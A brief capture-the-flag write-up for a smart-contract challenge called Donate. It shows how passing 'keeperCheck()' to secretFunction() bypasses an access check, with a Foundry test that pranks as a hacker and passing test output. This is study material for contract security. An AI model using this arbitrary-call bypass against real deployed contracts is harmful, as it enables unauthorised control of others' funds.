## Donate

1. In contract Donate.sol we need to call `keeperCheck()` and return `true` that can be done by simply calling `secretFunction()` with the argument as `keeperCheck()`.

2. The reason it can be done is because the `secretFunction()` calls a function from the address of self and another is just passing `keeperCheck()` as the hacker.

3. To solve this, I just copy paste the Contract in my foundry setup. 

4. Then copy the provided boilerplate of foundry test.

5. Change the import to correct `import "../src/Donate.sol";`

6. And add the `donate.secretFunction("keeperCheck()");` in my test file of foundry.

7. Run forge test.

```solidity
function testhack() public {
    vm.startPrank(hacker);
		// Hack Time
        donate.secretFunction("keeperCheck()");
    }

```

8. Test passes.

lavishq@earth:~/Desktop/POC /foundry_foundry
$ forge test
[⠊] Compiling...
[⠑] Installing solc version 0.8.0
[⠃] Successfully installed solc 0.8.0
[⠊] Compiling 22 files with 0.8.17
[⠔] Compiling 1 files with 0.8.0
[⠒] Solc 0.8.0 finished in 2.41s
[⠒] Solc 0.8.17 finished in 2.45s
Compiler run successful

Running 1 test for test/Donate.t.sol:donateHack
[PASS] testhack() (gas: 14586)
Test result: ok. 1 passed; 0 failed; finished in 3.86ms

Running 2 tests for test/Counter.t.sol:CounterTest
[PASS] testIncrement() (gas: 28334)
[PASS] testSetNumber(uint256) (runs: 256, μ: 27320, ~: 28409)
Test result: ok. 2 passed; 0 failed; finished in 14.56ms